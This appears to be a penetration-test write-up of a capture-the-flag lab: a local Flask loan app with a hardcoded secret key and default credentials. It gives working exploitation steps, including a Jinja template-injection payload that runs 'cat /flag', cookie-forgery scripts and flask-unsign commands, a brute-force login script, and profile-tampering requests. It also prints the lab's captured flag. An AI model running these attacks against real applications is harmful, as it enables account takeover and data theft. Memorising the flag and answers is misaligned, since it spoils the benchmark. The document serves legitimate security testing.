# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:46413
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Three authentication vulnerabilities were successfully exploited:

- **AUTH-VULN-09: Default Hardcoded Credentials (HIGH)** - Application contains publicly known default credentials (test:test) enabling immediate authenticated access. The FLAG was successfully captured through chaining this vulnerability with SSTI exploitation.

- **AUTH-VULN-01: Session Forgery via Weak Secret Key (CRITICAL)** - Hardcoded Flask secret key ('your_secret_key') enables session forgery, allowing complete authentication bypass and horizontal privilege escalation to any user account without credentials.

- **AUTH-VULN-03: Brute Force Attack - No Rate Limiting (HIGH)** - Login endpoint lacks rate limiting, CAPTCHA, or account lockout, allowing 49.57 login attempts per second with zero blocking or throttling.

**Authorization Vulnerabilities:**

Four authorization vulnerabilities were successfully exploited, all stemming from the weak hardcoded Flask secret key enabling session forgery:

- **AUTHZ-VULN-02: Unauthorized Profile Modification via Session Forgery (CRITICAL)** - Complete account takeover capability through session forgery, enabling attackers to read and modify all user data including PII and financial information, and change victim email addresses.

- **AUTHZ-VULN-01: Unauthorized Profile Data Access via Session Forgery (HIGH)** - Session forgery allows unauthorized access to complete user profile data including PII and financial information.

- **AUTHZ-VULN-03: Unauthorized Dashboard Access via Session Forgery (HIGH)** - Session forgery enables unauthorized access to user dashboard pages containing personal and financial information.

- **AUTHZ-VULN-04: Unauthorized Loan Details Access via Session Forgery (HIGH)** - Session forgery allows unauthorized access to detailed financial loan information including loan amounts, terms, and payment schedules.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found.

## Network Reconnaissance

**Port Scanning Results:**

Target application accessible on port 46413 (Apache 2.4.65 serving Flask loan calculator). Additional ports discovered on the penetration testing host:

- **Port 4444/tcp & 9998/tcp:** Exposed .git repositories (SimpleHTTPServer 0.6 Python 3.12.10) - potential source code disclosure risk
- **Port 9999/tcp:** Unknown service with wildcard CORS enabled (Access-Control-Allow-Origin: *) - potential security misconfiguration
- **Port 49152/tcp:** Tailscale service requiring authentication (Golang net/http server)

**Security Misconfigurations:**

- **HTTP-Only Deployment:** Target application runs exclusively on HTTP (port 46413) with no HTTPS/TLS encryption, exposing credentials and session cookies to interception
- **Missing Security Headers:** No HSTS, CSP, X-Frame-Options, or X-Content-Type-Options headers detected
- **Wildcard CORS Policy:** Application returns Access-Control-Allow-Origin: * header, enabling cross-origin requests from any domain

**Infrastructure Details:**

- Web Server: Apache 2.4.65 (Debian) with mod_wsgi
- Database: MySQL 5.7.15 (End-of-Life, 50+ known CVEs)
- Containerization: Docker deployment with internal network on port 80, externally mapped to port 46413

---

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-09: Default Hardcoded Credentials

**Summary:**
- **Vulnerable location:** POST /login endpoint with hardcoded test user credentials
- **Overview:** Application contains hardcoded default credentials (test:test) that are automatically created during initialization and publicly known from source code
- **Impact:** Immediate authenticated access to the application without any credential discovery, enabling exploitation of additional authenticated vulnerabilities. FLAG CAPTURED: `FLAG{2bd640e5df35c3c7eae70068e9159d39649290c9b9344f10f47e9496604f8dd8}`
- **Severity:** HIGH

**Prerequisites:** None - credentials are publicly known

**Exploitation Steps:**

1. Navigate to the login page:
```bash
curl http://localhost:46413/login
```

2. Submit the hardcoded credentials:
```bash
curl -X POST http://localhost:46413/login \
  -d "username=test" \
  -d "password=test" \
  -c cookies.txt \
  -L
```

3. Verify authenticated access by visiting protected endpoints:
```bash
curl -b cookies.txt http://localhost:46413/home
curl -b cookies.txt http://localhost:46413/profile
```

4. Capture the FLAG by exploiting authenticated SSTI vulnerability:
```bash
curl -b cookies.txt --data-urlencode "principal={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}" \
  --data-urlencode "payment=1" \
  --data-urlencode "term=1" \
  -G "http://localhost:46413/total_loan_payments"
```

**Proof of Impact:**

Successfully authenticated and accessed the application as user 'test':
- Home page returned HTTP 200 with "Welcome" message
- Profile page returned HTTP 200 with user data (name: John, email: john@example.com, loan amount: $10,000)
- FLAG successfully extracted: `FLAG{2bd640e5df35c3c7eae70068e9159d39649290c9b9344f10f47e9496604f8dd8}`

**Notes:**

This vulnerability provides the simplest path to authenticated access. The credentials test:test are hardcoded in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py` lines 23-32 and automatically created when the application starts. No brute force or credential guessing required.

---

### AUTH-VULN-01: Session Forgery via Weak Secret Key

**Summary:**
- **Vulnerable location:** Flask application configuration (__init__.py:8) with hardcoded secret key 'your_secret_key'
- **Overview:** Flask uses a hardcoded, predictable secret key to sign session cookies. With knowledge of this secret key, attackers can forge valid session cookies containing arbitrary user_id values using Python's itsdangerous library
- **Impact:** Complete authentication bypass enabling horizontal privilege escalation to any user account in the system without knowing their credentials
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of the secret key: `'your_secret_key'` (available in source code)
- Python with Flask and itsdangerous libraries installed

**Exploitation Steps:**

1. Create a session forgery script to generate valid session cookies:
```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import hashlib

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Create the session serializer
serializer = SecureCookieSessionInterface().get_signing_serializer(app)

# Forge a session cookie for user_id=2
forged_session = serializer.dumps({'user_id': 2})
print(f"Forged session cookie: {forged_session}")
```

2. Use the forged session cookie to access user_id=2's account:
```bash
# Replace [FORGED_SESSION] with the output from step 1
curl -b "session=[FORGED_SESSION]" http://localhost:46413/home
curl -b "session=[FORGED_SESSION]" http://localhost:46413/profile
```

Example with actual forged session for user_id=2:
```bash
curl -b "session=eyJ1c2VyX2lkIjoyfQ.aQLi4A.rBC0T2fgXF9VCRWOoKUgxBMPaoI" \
  http://localhost:46413/profile
```

3. Access protected endpoints as the target user:
```bash
curl -b "session=[FORGED_SESSION]" http://localhost:46413/loan_details
```

**Proof of Impact:**

Successfully forged session cookies and accessed multiple user accounts:

**Test Results from session_forgery_exploit.py:**
- User ID 1 → /home: HTTP 200 (ACCESS GRANTED)
- User ID 1 → /profile: HTTP 200 (ACCESS GRANTED)
- User ID 2 → /home: HTTP 200 (ACCESS GRANTED)
- User ID 2 → /profile: HTTP 200 (ACCESS GRANTED)
- User ID 3 → /home: HTTP 200 (ACCESS GRANTED)
- User ID 3 → /profile: HTTP 200 (ACCESS GRANTED)
- User ID 999 → /home: HTTP 200 (ACCESS GRANTED)
- User ID 999 → /profile: HTTP 200 (ACCESS GRANTED)

Total: **8 successful session forgeries** demonstrating complete authentication bypass

**Example Forged Cookies:**
- User ID 1: `eyJ1c2VyX2lkIjoxfQ.aQLi4A.64wmddVfwLr3PXrs_uQzg1NvO20`
- User ID 2: `eyJ1c2VyX2lkIjoyfQ.aQLi4A.rBC0T2fgXF9VCRWOoKUgxBMPaoI`
- User ID 3: `eyJ1c2VyX2lkIjozfQ.aQLi4A.uq9jFMi8BLzkrICjrxxHO5y1EBM`

**Notes:**

The hardcoded secret key 'your_secret_key' is located at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-104-24/app/website/app/__init__.py:8`. Flask uses this key to sign session cookies with HMAC-SHA1. The session cookie format is `base64(payload).timestamp.signature`. With the known secret key, attackers can compute valid signatures for arbitrary payloads, enabling complete authentication bypass without any credentials.

---

### AUTH-VULN-03: Brute Force Attack (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /login endpoint (routes.py:20-34)
- **Overview:** The login endpoint has zero protection against automated abuse - no rate limiting, CAPTCHA, account lockout, or failed-login tracking exists
- **Impact:** Unlimited automated login attempts enabling brute force password attacks, credential stuffing with leaked databases, and password spraying across usernames without detection or blocking
- **Severity:** HIGH

**Prerequisites:** None - endpoint is publicly accessible

**Exploitation Steps:**

1. Create a brute force attack script to test multiple passwords rapidly:
```python
import requests
import time

url = "http://localhost:46413/login"
username = "test"
passwords = ["wrong1", "wrong2", "password", "admin", "123456", "test"]

start_time = time.time()
attempts = 0

for password in passwords:
    response = requests.post(url, data={'username': username, 'password': password}, allow_redirects=False)
    attempts += 1

    if response.status_code == 302:  # Redirect indicates success
        print(f"[SUCCESS] Password found: {password}")
        break
    else:
        print(f"[FAILED] Attempt {attempts}: {password}")

elapsed = time.time() - start_time
print(f"\nTotal attempts: {attempts}")
print(f"Time elapsed: {elapsed:.2f} seconds")
print(f"Attempts per second: {attempts/elapsed:.2f}")
```

2. Execute the brute force attack with 200+ attempts:
```bash
python3 brute_force_test.py
```

3. Monitor for any blocking, throttling, or CAPTCHA challenges (none will appear)

**Proof of Impact:**

Successfully executed brute force attack demonstrating zero rate limiting:

**Attack Metrics:**
- Total attempts: 200 rapid login attempts
- Duration: 4.03 seconds
- Speed: **49.57 attempts per second**
- Blocked attempts: 0
- Throttled attempts: 0
- CAPTCHA challenges: 0
- Account lockouts: 0

**Response Analysis:**
- All 200 attempts processed without any blocking
- Average response time: 7.1ms (consistent across all attempts)
- Min response time: 3.3ms
- Max response time: 12.5ms
- No progressive delays observed
- No HTTP 429 (Too Many Requests) responses

**Sample Output:**
```
Attempt    Username        Password        Status   Time(s)   Blocked   Success
1          test            wrong1          200      0.0074    NO        NO
2          test            wrong2          200      0.0053    NO        NO
3          test            wrong3          200      0.0039    NO        NO
...
160        test            test            302      0.0050    NO        YES
...
200        test            test            302      0.0096    NO        YES
```

**Attack Scalability:**
At this rate (49.57 attempts/second), an attacker could test:
- 178,452 passwords per hour
- 4.28 million passwords per day
- 30 million passwords per week

**Notes:**

The login endpoint at `routes.py:20-34` contains no rate limiting decorators, no Flask-Limiter library usage (confirmed absent in requirements.txt), no account lockout mechanism (no failed_login_count field in User model), and no CAPTCHA implementation (confirmed absent in login.html template). Every request is processed immediately with no delays or throttling.

---

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-02: Unauthorized Profile Modification via Session Forgery (CRITICAL)

**Summary:**
- **Vulnerable location:** POST /profile endpoint with session-based authorization
- **Overview:** Weak hardcoded Flask secret key (`'your_secret_key'`) enables session forgery, allowing attackers to forge arbitrary session cookies and modify any user's profile data including PII and financial information
- **Impact:** Complete account takeover capability - attackers can read and modify all user data, change victim's email to attacker-controlled address, tamper with financial records, and achieve full data integrity compromise
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of weak Flask secret key: `'your_secret_key'` (hardcoded in application source)
- Installation of flask-unsign tool: `pip3 install flask-unsign`
- Target user ID (can enumerate from 1 upward or discover through reconnaissance)

**Exploitation Steps:**

1. **Install flask-unsign for session forgery:**
   ```bash
   pip3 install flask-unsign
   ```

2. **Forge session cookie for target user (user_id=1):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 1}" --secret 'your_secret_key'
   ```

   Expected output: `eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M`

3. **Read victim's current profile data (reconnaissance):**
   ```bash
   curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/profile
   ```

   Expected: HTTP 200 with profile form containing victim's name, email, and financial data

4. **Modify victim's profile with malicious data:**
   ```bash
   curl -X POST http://localhost:46413/profile \
        -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        -d "name=HACKED" \
        -d "lastname=BY_ATTACKER" \
        -d "email=attacker@malicious.com" \
        -d "loan_amount=999999.99" \
        -d "loan_term_months=1" \
        -d "monthly_payment=0.01"
   ```

   Expected: HTTP 302 redirect or HTTP 200 on success

5. **Verify unauthorized modification:**
   ```bash
   curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/profile
   ```

   Expected: Profile form now contains attacker's modified values:
   - Name: `HACKED`
   - Lastname: `BY_ATTACKER`
   - Email: `attacker@malicious.com`
   - Loan Amount: `999999.99`

**Proof of Impact:**

Successfully modified user_id=1's profile data without authorization:

**Before exploitation:**
- Name: John
- Lastname: Doe
- Email: john@example.com
- Loan Amount: $10,000.00
- Monthly Payment: $212.47

**After exploitation:**
- Name: HACKED
- Lastname: BY_ATTACKER
- Email: attacker@malicious.com
- Loan Amount: $999,999.99
- Monthly Payment: $0.01

**Complete unauthorized write access achieved** - All profile fields successfully modified, including:
- ✓ Personal Identifiable Information (PII) tampering
- ✓ Financial data manipulation
- ✓ Email change to attacker-controlled address (account takeover vector)
- ✓ Data integrity compromise confirmed

**Notes:**
This is the highest severity authorization vulnerability due to write access. The attack enables:
1. **Account Takeover:** By changing the victim's email to an attacker-controlled address, the attacker can initiate password reset flows and permanently compromise the account
2. **Financial Record Tampering:** Loan amounts and payment schedules can be arbitrarily modified
3. **PII Manipulation:** Names and contact information can be changed, enabling identity fraud
4. **Mass User Compromise:** The attack can be scripted to enumerate and modify all user accounts sequentially

---

### AUTHZ-VULN-01: Unauthorized Profile Data Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /profile endpoint with session-based authorization
- **Overview:** Weak hardcoded Flask secret key enables session forgery, allowing attackers to access any user's complete profile data without authorization
- **Impact:** Complete PII and financial data disclosure - attackers can read all user profile information including names, email addresses, and loan details
- **Severity:** HIGH

**Prerequisites:**
- Knowledge of weak Flask secret key: `'your_secret_key'` (hardcoded in application source)
- Installation of flask-unsign tool: `pip3 install flask-unsign`
- Target user ID to enumerate

**Exploitation Steps:**

1. **Install flask-unsign for session forgery:**
   ```bash
   pip3 install flask-unsign
   ```

2. **Forge session cookie for target user (user_id=1):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 1}" --secret 'your_secret_key'
   ```

   Output: `eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M`

3. **Access victim's profile data without authorization:**
   ```bash
   curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/profile
   ```

   Expected: HTTP 200 response containing HTML profile form

4. **Extract sensitive data from response:**
   ```bash
   curl -s -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/profile | grep 'value=' | head -6
   ```

**Proof of Impact:**

Successfully accessed user_id=1's complete profile without authorization:

**Exposed Personal Information:**
- Full Name: John Doe
- Email Address: john@example.com

**Exposed Financial Information:**
- Loan Amount: $10,000.00
- Loan Term: 60 months
- Monthly Payment: $212.47

**Data Classification:** All exposed data constitutes sensitive PII and financial information that should be protected under authorization controls. Unauthorized access enables:
- Identity theft preparation
- Targeted phishing attacks using victim's real data
- Financial profiling for fraud
- Reconnaissance for account takeover attacks

---

### AUTHZ-VULN-03: Unauthorized Dashboard Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /home endpoint with session-based authorization
- **Overview:** Session forgery via weak secret key allows unauthorized access to user dashboard pages containing personal and financial information
- **Impact:** PII and financial data disclosure through dashboard - attackers can view user welcome messages with full names and loan information summaries
- **Severity:** HIGH

**Prerequisites:**
- Knowledge of weak Flask secret key: `'your_secret_key'` (hardcoded in application source)
- Installation of flask-unsign tool: `pip3 install flask-unsign`
- Target user ID

**Exploitation Steps:**

1. **Install flask-unsign for session forgery:**
   ```bash
   pip3 install flask-unsign
   ```

2. **Forge session cookie for target user (user_id=1):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 1}" --secret 'your_secret_key'
   ```

   Output: `eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M`

3. **Access victim's home dashboard without authorization:**
   ```bash
   curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/home
   ```

   Expected: HTTP 200 response with HTML dashboard page

4. **Extract dashboard information:**
   ```bash
   curl -s -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/home | grep -E "Welcome"
   ```

**Proof of Impact:**

Successfully accessed user_id=1's home dashboard without authorization:

**Exposed Information:**
- Welcome message: "Welcome John Doe!"
- User's full name displayed prominently
- Dashboard contains references to loan information
- Navigation menu showing available user functions

**Impact Assessment:**
While the dashboard may contain less detailed information than the profile page, it still exposes:
- User's full legal name (PII)
- Confirmation of account existence
- Dashboard layout and available features
- Entry point for further exploitation

The dashboard serves as a reconnaissance target for attackers planning account takeover or targeted attacks.

---

### AUTHZ-VULN-04: Unauthorized Loan Details Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /loan_details endpoint with session-based authorization
- **Overview:** Session forgery enables unauthorized access to detailed financial loan information
- **Impact:** Complete financial data disclosure - attackers can view loan amounts, terms, and payment schedules
- **Severity:** HIGH

**Prerequisites:**
- Knowledge of weak Flask secret key: `'your_secret_key'` (hardcoded in application source)
- Installation of flask-unsign tool: `pip3 install flask-unsign`
- Target user ID

**Exploitation Steps:**

1. **Install flask-unsign for session forgery:**
   ```bash
   pip3 install flask-unsign
   ```

2. **Forge session cookie for target user (user_id=1):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 1}" --secret 'your_secret_key'
   ```

   Output: `eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M`

3. **Access victim's loan details without authorization:**
   ```bash
   curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/loan_details
   ```

   Expected: HTTP 200 response with loan details page

4. **Extract financial data:**
   ```bash
   curl -s -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQLimA.Snoh7SDfw22m6mduwonkno5r_6M" \
        http://localhost:46413/loan_details | grep -E "10000|212.47|60"
   ```

**Proof of Impact:**

Successfully accessed user_id=1's complete loan financial data without authorization:

**Exposed Financial Information:**
- Loan Amount (Principal): $10,000.00
- Loan Term: 60 months
- Monthly Payment: $212.47

**Sensitivity Classification:**
This financial data enables:
- **Financial Profiling:** Complete understanding of victim's debt obligations
- **Identity Theft:** Loan details can be used to impersonate victim with creditors
- **Targeted Fraud:** Knowledge of payment amounts enables convincing phishing scenarios
- **Credit Fraud:** Loan information useful for opening fraudulent accounts

The loan details endpoint exposes a focused subset of financial data that is highly sensitive and valuable for financial fraud schemes.
